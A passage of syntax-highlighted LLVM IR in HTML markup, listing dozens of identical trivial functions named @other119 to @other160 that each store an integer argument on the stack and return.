class="keyword">define</span> dso_local void <span class="title">@other119</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other120</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other121</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other122</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other123</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other124</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other125</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other126</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other127</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other128</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other129</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other130</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other131</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other132</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other133</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other134</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other135</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other136</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other137</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other138</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other139</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other140</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other141</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other142</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other143</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other144</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other145</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other146</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other147</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other148</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other149</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other150</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other151</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other152</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other153</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other154</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other155</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other156</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other157</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other158</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other159</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other160</span>(<span 